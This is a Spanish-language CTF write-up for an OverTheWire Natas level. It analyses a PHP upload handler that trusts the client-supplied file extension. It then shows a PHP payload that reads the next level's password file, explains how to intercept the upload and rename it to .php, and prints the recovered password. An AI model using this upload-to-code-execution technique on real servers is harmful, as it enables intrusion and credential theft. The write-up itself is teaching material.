Si inspeccionamos el HTML, vemos que nos pide seleccionar un archivo para
enviar. Analizamos el codigo fuente de la página.

En primer lugar tenemos una función que genera una cadena aleatoria de 10
caracteres alfanúmericos.

```php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}
```

Luego, una función que genera un path aleatoria en un directorio y con una
extensión dada.

```php
function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
```

Luego, se define una función que crea un path aleatorio en un directorio dado, con la misma extensión que un archivo dado.

```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
```

Finalmente, ante un POST, se obtiene el archivo y se guarda dentro de la carpeta
'upload', con la extensión dada en `filename`.

```php
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
```

Si subimos un archivo de php, el servidor lo renderizará cuando tratemos de
accederlo...

```bash
<?php

readfile("/etc/natas_webpass/natas13");
```

Al subirlo, también debemos interceptarlo para modificar el `filename`. Debe
terminar en `.php`.

Al abrir el archivo, obtendremos la contraseña:

```txt
lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
```

